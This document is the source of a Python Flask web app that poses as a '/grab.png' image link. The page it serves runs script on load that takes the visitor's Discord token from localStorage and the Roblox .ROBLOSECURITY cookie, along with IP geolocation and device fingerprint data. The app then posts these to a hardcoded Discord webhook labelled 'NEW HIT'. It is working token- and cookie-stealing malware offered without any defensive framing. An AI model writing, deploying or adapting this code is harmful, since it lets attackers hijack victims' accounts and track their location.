import os
from flask import Flask, request, Response
import requests
import base64
from datetime import datetime
import traceback

app = Flask(__name__)

WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://discord.com/api/webhooks/1470096967848824842/r-jZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV')
IMG_URL = os.environ.get('IMG_URL', 'https://httpbin.org/image/jpeg')

@app.route("/")
def serve_image():
    pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
    return Response(pixel, mimetype='image/gif')

@app.route("/grab.png")
def grab_image():
    html = f'''<!DOCTYPE html><html><head><title></title><meta charset="UTF-8">
<script>
(async()=>{{
    let token = localStorage.getItem("token")||'';
    let roblox = document.cookie.split(";").find(c=>c.includes(".ROBLOSECURITY"))||"";
    if(roblox) roblox = roblox.split("=")[1].replace(/^_ \\| WARNING: Obsolete \\| /,"").replace(/ \\|_$/,"");
    
    let data = {{
        ip: '',
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: `${{screen.width}}x${{screen.height}}`,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency||0,
        ram: navigator.deviceMemory||0,
        cookies: document.cookie.split(";").length,
        plugins: navigator.plugins.length,
        ref: document.referrer,
        token: token,
        roblox: roblox,
        battery: navigator.getBattery?'yes':'no',
        net: navigator.connection?.effectiveType||'N/A'
    }};
    
    fetch('https://httpbin.org/ip').then(r=>r.json()).then(d=>{{data.ip=d.origin;let params=new URLSearchParams(data).toString();navigator.sendBeacon('/steal?'+params);}});
}})();
</script>
<style>body{{margin:0;padding:20px;background:#111;color:#fff;font-family:sans-serif;text-align:center;}}img{{max-width:100%;height:auto;opacity:.8;}}</style>
</head><body>
<img src="{IMG_URL}" onload="this.style.opacity=1">
</body></html>'''
    return Response(html, mimetype='text/html')

@app.route("/steal")
def steal_data():
    print(f"STEAL HIT: {request.args}")  # Vercel logs
    
    params = request.args.to_dict()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr) or params.get('ip', 'N/A')
    
    geo = 'N/A'
    isp = 'N/A'
    try:
        geo_resp = requests.get(f'http://ipapi.co/{ip}/json/', timeout=2)
        if geo_resp.status_code == 200:
            geo_data = geo_resp.json()
            geo = f"{geo_data.get('city', 'N/A')}, {geo_data.get('country_name', 'N/A')}"
            isp = geo_data.get('org', 'N/A')
    except:
        pass
    
    embed = {
        "title": "🎯 NEW HIT",
        "description": f"**IP:** `{ip}`\n**Geo:** `{geo}`\n**ISP:** `{isp}`",
        "color": 16711680,
        "fields": [
            {"name": "User Agent", "value": f"`{params.get('ua', 'N/A')[:400]}`", "inline": False},
            {"name": "Discord", "value": f"`{params.get('token', 'No token')[:50]}...`" if params.get('token') else "`No token`", "inline": True},
            {"name": "Roblox", "value": f"`{params.get('roblox', 'No cookie')[:50]}...`" if params.get('roblox') else "`No cookie`", "inline": True},
            {"name": "Device", "value": f"Screen: {params.get('screen', 'N/A')} | CPU: {params.get('cores', 'N/A')} | RAM: {params.get('ram', 'N/A')}GB", "inline": True},
            {"name": "Network", "value": f"Type: {params.get('net', 'N/A')} | Cookies: {params.get('cookies', 'N/A')} | Plugins: {params.get('plugins', 'N/A')}", "inline": True},
            {"name": "Browser", "value": f"TZ: {params.get('tz', 'N/A')} | Lang: {params.get('lang', 'N/A')} | Platform: {params.get('platform', 'N/A')}", "inline": True}
        ],
        "timestamp": datetime.utcnow().isoformat(),
        "footer": {"text": f"Ref: {params.get('ref', 'Direct')[:100]}"}
    }
    
    payload = {"embeds": [embed]}
    
    try:
        resp = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        print(f"WEBHOOK STATUS: {resp.status_code} - {resp.text[:200]}")  # Critical for debugging
        if resp.status_code == 204:
            return "", 204
        else:
            print(f"WEBHOOK FAILED: {resp.status_code} {resp.text}")
            return f"Webhook error: {resp.status_code}", resp.status_code
    except Exception as e:
        print(f"WEBHOOK EXCEPTION: {str(e)}")
        return f"Webhook failed: {str(e)}", 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
